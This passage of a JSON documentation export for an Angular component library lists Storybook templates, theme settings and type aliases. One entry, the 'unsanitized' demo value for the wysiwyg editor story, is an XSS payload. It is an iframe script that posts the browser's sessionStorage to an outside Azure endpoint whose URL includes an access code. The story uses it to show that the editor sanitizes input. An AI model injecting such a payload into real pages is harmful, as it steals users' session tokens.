            "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: args,\r\n    template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args: StoBreadcrumbsComponent) => {\r\n  return {\r\n    props: args,\r\n    // template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args: StoFilterPanelComponent) => {\r\n  return {\r\n    component: StoFilterPanelComponent,\r\n    props: args,\r\n    template: `\r\n      <sto-filter-panel class=\"sto-form\"\r\n                        [expandable]=\"expandable\"\r\n                        [expanded]=\"expanded\"\r\n                        (toggled)=\"toggled()\">\r\n          <sto-filter-title>{{ title }}</sto-filter-title>\r\n          <sto-filter-table-actions>\r\n              <button mat-icon-button>\r\n                  <mat-icon>add</mat-icon>\r\n              </button>\r\n          </sto-filter-table-actions>\r\n          <div class=\"sto-form\"\r\n               stoGrid>\r\n              <mat-form-field floatLabel=\"always\"\r\n              stoFormField\r\n                              stoGridColumn>\r\n                  <mat-label>Field 1</mat-label>\r\n                  <input matInput>\r\n              </mat-form-field>\r\n              <mat-form-field floatLabel=\"always\"\r\n              stoFormField\r\n                              stoGridColumn>\r\n                  <mat-label>Field 2 (multi)</mat-label>\r\n                  <mat-select [multiple]=\"true\">\r\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\r\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\r\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\r\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\r\n                  </mat-select>\r\n              </mat-form-field>\r\n              <div stoGridColumn\r\n                   [stoGridColumnDouble]=\"true\"\r\n                   stoGridSpacer></div>\r\n          </div>\r\n      </sto-filter-panel>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    component: StoMessagePanelComponent,\r\n    props: { ...args, dismissed: action('Dismissed') },\r\n    template: '<sto-message-panel [color]=\"color\" [dismissable]=\"dismissable\" [icon]=\"icon\" (dismissed)=\"dismissed()\">{{ contents }}</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<NavDrawerComponent>",
            "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args: StoDrawerComponent) => {\r\n  const actions = {\r\n    handleCommand: action('Link pressed'),\r\n    topsNav: action('Open tops landing'),\r\n    toggle: action('Switch side'),\r\n    closeMenu: action('Close menu'),\r\n  };\r\n  return {\r\n    component: StoDrawerComponent,\r\n    props: { ...args, ...actions, navigation, subNavigation },\r\n    template: `<div>\r\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\r\n<sto-drawer-header>\r\n<div class=\"sto-drawer__header__infix\">\r\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\r\n                type=\"button\"\r\n                mat-icon-button\r\n                (click)=\"toggle(); activePane = 'left'\">\r\n          <mat-icon>arrow_back</mat-icon>\r\n        </button>\r\n        <ng-template #topIcon>\r\n          <button mat-icon-button\r\n          type=\"button\"\r\n          (click)=\"topsNav()\">\r\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\r\n          </button>\r\n        </ng-template>\r\n      </div>\r\n<div class=\"sto-drawer__header__title\">\r\n        <ng-container *ngIf=\"activePane === 'right'; else leftName;\">\r\n          <span *ngIf=\"activePane === 'right'\">\r\n           {{rightMenu.name}}\r\n         </span>\r\n        </ng-container>\r\n        <ng-template #leftName>\r\n         <span *ngIf=\"activePane === 'left'\">\r\n           {{leftMenu.name}}\r\n         </span>\r\n        </ng-template>\r\n      </div>\r\n      <div class=\"sto-drawer__header__suffix\">\r\n        <button type=\"button\"\r\n                mat-icon-button\r\n                (click)=\"closeMenu(); open = false\">\r\n          <mat-icon>close</mat-icon>\r\n        </button>\r\n      </div>\r\n</sto-drawer-header>\r\n<sto-slide-panel class=\"sto-slide-panel\"\r\n                     [activePane]=\"activePane\">\r\n                     {{activePane}}\r\n<sto-navigation-menu [menu]=\"subNavigation\"\r\n*ngIf=\"activePane === 'right'\"\r\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\r\n                         rightPane></sto-navigation-menu>\r\n<sto-navigation-menu [menu]=\"navigation\"\r\n*ngIf=\"activePane === 'left'\"\r\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\r\n                         leftPane></sto-navigation-menu>\r\n                         </sto-slide-panel>\r\n</sto-drawer>\r\n\r\n\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n</div>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoDrawerComponent>",
            "defaultValue": "(args: StoDrawerComponent) => {\r\n  return {\r\n    component: StoDrawerComponent,\r\n    props: args,\r\n    template: `\r\n  <div>\r\n  <sto-drawer [position]=\"position\" [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\r\n<sto-drawer-header>\r\n<div class=\"sto-drawer__header__title\">\r\n<h2>Title</h2>\r\n      </div>\r\n</sto-drawer-header>\r\n\r\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\r\n\r\n<sto-drawer-footer>\r\n<button mat-button color=\"primary\">Save</button>\r\n</sto-drawer-footer>\r\n</sto-drawer>\r\n\r\n\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n</div>\r\n`,\r\n\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/number-input.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args) => {\r\n  return {\r\n    component: NumberInputComponent,\r\n    props: {\r\n      ...args,\r\n      change: action('Value changed'),\r\n      control: new FormControl(null, Validators.required),\r\n      toggleValidator: (ctrl: AbstractControl) => {\r\n        if ( ctrl.validator ) {\r\n          ctrl.clearValidators();\r\n        } else {\r\n          ctrl.setValidators(Validators.required);\r\n        }\r\n        ctrl.updateValueAndValidity();\r\n      },\r\n    },\r\n    template: `\r\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\r\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\r\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\r\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\r\n    <mat-form-field stoFormField floatLabel=\"always\">\r\n      <mat-label>{{label}}</mat-label>\r\n      <sto-number-input (ngModelChange)=\"change($event)\"\r\n            [dynamicFractionSize]=\"dynamicFractionSize\"\r\n                        [fractionSize]=\"fractionSize\"\r\n                        [readonly]=\"readonly\"\r\n                        [formControl]=\"control\"\r\n                        [placeholder]=\"placeholder\">\r\n      </sto-number-input>\r\n      <span matSuffix>{{ suffix }}</span>\r\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\r\n    </mat-form-field><br>\r\n    {{control.value}}\r\n  </mat-card>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args) => {\r\n  return {\r\n    component: NumberUnitInputComponent,\r\n    props: {\r\n      ...args,\r\n      control,\r\n      change: action('Value changed'),\r\n    },\r\n    template: `\r\n<mat-card class=\"sto-form\" style=\"width: 600px\">\r\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\r\n    <mat-form-field stoFormField floatLabel=\"always\">\r\n      <mat-label>{{label}}</mat-label>\r\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\r\n      [fractionSize]=\"fractionSize\"\r\n      [list]=\"units\"\r\n      [readonly]=\"readonly\"\r\n      [formControl]=\"control\"\r\n      [unitPlaceholder]=\"unitPlaceholder\"\r\n      [unitClearText]=\"unitClearText\"\r\n      [unitOptional]=\"unitOptional\"\r\n      [placeholder]=\"placeholder\">\r\n      </sto-number-unit-input>\r\n    </mat-form-field><br>\r\n    {{control.value | json}}\r\n  </mat-card>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<SlideToggleComponent>",
            "defaultValue": "(args) => {\r\n  return {\r\n    component: SlideToggleComponent,\r\n    props: {\r\n      ...args,\r\n      ctrl: new FormControl(true),\r\n      valueChange: action('Value changed'),\r\n    },\r\n    template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\">\r\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\r\n<mat-form-field stoFormField floatLabel=\"always\">\r\n    <mat-label>Slide toggle</mat-label>\r\n    <sto-slide-toggle [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\r\n</mat-form-field>\r\n</mat-card>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
            "defaultValue": "(args) => {\r\n  return {\r\n    component: FormFieldDirective,\r\n    props: args,\r\n    template: `\r\n  <mat-card class=\"sto-form\">\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Form field with styles</mat-label>\r\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\r\n</mat-form-field>\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Form field with styles</mat-label>\r\n<mat-select><mat-option value=\"B\">A</mat-option></mat-select>\r\n</mat-form-field>\r\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\r\n<mat-label>Form field without styles</mat-label>\r\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\r\n</mat-form-field>\r\n<mat-form-field stoFormField *ngIf=\"withClasses\">\r\n<mat-label>Text area with styles</mat-label>\r\n<textarea matInput [cdkTextareaAutosize]=\"true\">\r\nSome Text Content\r\n\r\nShould not select all on click\r\n</textarea>\r\n</mat-form-field>\r\n</mat-card>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<WysiwygComponent>",
            "defaultValue": "(args) => {\r\n  const ctrl = new FormControl(unsanitized);\r\n  return {\r\n    props: { ...args, ctrl, unsanitized },\r\n    template: `\r\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\r\n<hr>\r\n<div>\r\n<p>The text we're sending in is</p>\r\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\r\n<br>\r\n<p>The resulting HTML output is then sanitized </p>\r\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\r\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\r\n(and preferable on your backend service)</p>\r\n</div>\r\n`\r\n  };\r\n}"
          },
          {
            "name": "THEME_SAVER",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/theme/theme-saver.service.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
          },
          {
            "name": "themes",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new Map<ThemeName, ThemeClassName>([\r\n  [ 'light', 'sto-light-theme' ],\r\n  [ 'dark', 'sto-dark-theme' ],\r\n])"
          },
          {
            "name": "typography",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/theme/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new Map<TypographyName, TypographyClassName>([\r\n  [ 'small', 'sto-sm-typography' ],\r\n  [ 'medium', 'sto-m-typography' ],\r\n  [ 'large', 'sto-l-typography' ],\r\n])"
          },
          {
            "name": "unsanitized",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\r\n</iframe>\r\n<b>This is bold.</b>\r\n`"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<PreferenceManagerComponent>",
            "defaultValue": "(args: PreferenceManagerComponent) => {\r\n  return {\r\n    props: {\r\n      ...args,\r\n      filterForm: new FormControl(),\r\n      onSelect: function (id: string) {\r\n        this.activePreferenceId = id;\r\n        this.filterForm.reset();\r\n        action('Select preference')(id);\r\n      },\r\n      onSetDefault: function (pref: Preference) {\r\n        const preferences = this.preferences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === pref.id);\r\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\r\n        prefs[ index ] = pref;\r\n        this.loadingIndicator = true;\r\n        action('Set default preference')(pref.name);\r\n        setTimeout(() => {\r\n          this.preferences = prefs;\r\n          this.loadingIndicator = false;\r\n        }, 300);\r\n      },\r\n      onEdit: function (pref: Preference) {\r\n        const preferences = this.preferences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === pref.id);\r\n        const prefs = [ ...preferences ];\r\n        prefs[ index ] = pref;\r\n        // Set preference in payload\r\n        this.loadingIndicator = true;\r\n        this.filterForm.markAsPristine();\r\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\r\n\r\n        setTimeout(() => {\r\n          this.preferences = prefs;\r\n          this.loadingIndicator = false;\r\n        }, 300);\r\n      },\r\n      onDeletePreference: function (id: string) {\r\n        action('Delete preference')(id);\r\n        const preferences = this.prerences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === id);\r\n        const prefs = [ ...preferences ];\r\n        prefs.splice(index, 1);\r\n        this.preferences = prefs;\r\n      },\r\n      onAdd: function (preference: Preference) {\r\n        action('Create preference')(preference);\r\n        preference.id = Date.now().toString(10);\r\n        this.preferences = [ ...this.preferences, preference ];\r\n      }\r\n    },\r\n    component: PreferenceManagerComponent,\r\n    template: `\r\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\r\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\r\n                                            (editPreference)=\"onEdit($event)\"\r\n                                            (addNewPreference)=\"onAdd($event)\"\r\n                                            [dirty]=\"filterForm.dirty\"\r\n                                            (deletePreference)=\"onDeletePreference($event)\"\r\n                                            (selectPreference)=\"onSelect($event)\"\r\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\r\n                                            [activePreferenceId]=\"activePreferenceId\"\r\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\r\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\r\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\r\n</sto-filter-panel>\r\n\r\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\r\n                                            (editPreference)=\"onEdit($event)\"\r\n                                            (addNewPreference)=\"onAdd($event)\"\r\n                                            [dirty]=\"filterForm.dirty\"\r\n                                            (deletePreference)=\"onDeletePreference($event)\"\r\n                                            (selectPreference)=\"onSelect($event)\"\r\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\r\n                                            [activePreferenceId]=\"activePreferenceId\"\r\n                                            [preferences]=\"preferences\"></sto-preference-manager>\r\n`\r\n  };\r\n}"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<ConfirmDemoComponent>",
            "defaultValue": "(args: ConfirmDemoComponent) => {\r\n  return {\r\n    component: ConfirmDemoComponent,\r\n    props: args,\r\n    template: '<app-confirm-demo></app-confirm-demo>'\r\n  };\r\n}"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/number-input.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "Usage",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "UsageWithInput",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "USE_HASH_ROUTING",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
          },
          {
            "name": "validCommands",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  'bold',\r\n  'underline',\r\n  'italic',\r\n  'createLink',\r\n  'insertUnorderedList',\r\n  'insertOrderedList',\r\n  'removeFormat',\r\n]"
          },
          {
            "name": "Warn",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warn\" [dismissable]=\"false\" icon=\"warning\">Warn Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "Warning",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"warning\" [dismissable]=\"false\" icon=\"warning\">Warning Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "WithAppHeader",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n    template: `\r\n    <sto-app-header></sto-app-header>\r\n    <sto-nav-drawer [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\r\n    `\r\n  };\r\n}"
          },
          {
            "name": "withForm",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoAppHeaderComponent>",
            "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      breadCrumbs: [\r\n        { label: 'Root', command: action('Root clicked'), segment: '' },\r\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\r\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\r\n      ],\r\n      environmentName: 'Systemtest',\r\n      homeConfig: { command: action('Home clicked') },\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    styles: [\r\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\r\n    ],\r\n    template: `\r\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\r\n  <div class=\"sto-header__form\">\r\n    <mat-form-field stoFormField floatLabel=\"never\">\r\n      <mat-icon matPrefix>search</mat-icon>\r\n      <input matInput placeholder=\"Search\">\r\n    </mat-form-field>\r\n  </div>\r\n</sto-app-header>\r\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\r\n`\r\n  };\r\n}"
          },
          {
            "name": "WithUserMenu",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoAppHeaderComponent>",
            "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      breadCrumbs: [\r\n        { label: 'Root', command: action('Root clicked'), segment: '' },\r\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\r\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\r\n      ],\r\n      environmentName: 'Systemtest',\r\n      homeConfig: { command: action('Home clicked') },\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    styles: [\r\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\r\n    ],\r\n    template: `\r\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\r\n<button mat-icon-button><mat-icon>home</mat-icon></button>\r\n</sto-app-header>\r\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\r\n`\r\n  };\r\n}"
          },
          {
            "name": "writeFile",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/build-scss.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "promisify(writeFileCb)"
          }
        ],
        "functions": [
          {
            "name": "LoggerFactory",
            "file": "libs/error-handler/src/lib/wrapper.ts",
            "ctype": "miscellaneous",
            "subtype": "function",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "args": [
              {
                "name": "http",
                "type": "HttpClient",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "jsdoctags": [
              {
                "name": "http",
                "type": "HttpClient",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "processScss",
            "file": "tools/scripts/build-scss.ts",
            "ctype": "miscellaneous",
            "subtype": "function",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "args": [
              {
                "name": "file",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "outFile",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "Promise<void>",
            "jsdoctags": [
              {
                "name": "file",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "outFile",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "typealiases": [
          {
            "name": "ClassFunction",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "function",
            "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 178
          },
          {
            "name": "CommonNavigation",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "literal type",
            "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 181
          },
          {
            "name": "Data",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "literal type",
            "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 181
          },
          {
            "name": "Handler",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "function",
            "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 178
          },
          {
            "name": "HeaderContextMenu",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "ContextMenu",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 177
          },
          {
            "name": "Menu",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "literal type",
            "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 181
          },
          {
            "name": "Menu",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 187
          },
          {
            "name": "Navigation",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "",
            "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 187
          },
          {
            "name": "NavigationChild",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "",
            "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 187
          },
          {
            "name": "PaneType",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "\"left\" | \"right\"",
            "file": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          },
          {
            "name": "ReturnValue",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "Promise<T> | Observable<T> | T",
            "file": "libs/common/src/lib/theme/theme-saver.service.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 186
          },
          {
            "name": "rowClassFn",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "function",
            "file": "libs/datatable/src/lib/sto-datatable/models.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "description": "",
            "kind": 178
          },
          {
            "name": "RowContextMenu",
            "ctype": "miscellaneous",
            "subtype": "typealias",
            "rawtype": "",
